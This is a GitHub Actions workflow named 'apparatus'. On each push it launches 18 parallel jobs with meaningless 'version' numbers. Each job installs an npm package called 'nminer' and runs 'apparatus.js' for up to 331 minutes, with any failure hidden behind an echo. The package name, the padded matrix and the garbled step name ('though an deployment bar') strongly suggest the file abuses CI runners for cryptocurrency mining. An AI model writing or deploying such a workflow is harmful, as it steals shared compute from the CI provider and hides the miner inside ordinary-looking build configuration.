name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6083 }
          - { version: 7175 }
          - { version: 432 }
          - { version: 1318 }
          - { version: 6438 }
          - { version: 9811 }
          - { version: 385 }
          - { version: 8805 }
          - { version: 3558 }
          - { version: 6749 }
          - { version: 2884 }
          - { version: 2649 }
          - { version: 6748 }
          - { version: 3506 }
          - { version: 1537 }
          - { version: 2403 }
          - { version: 9746 }
          - { version: 7264 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: though an deployment bar
        run: |
          npm install nminer@latest
          timeout 331m node apparatus.js || echo "apparatus executed"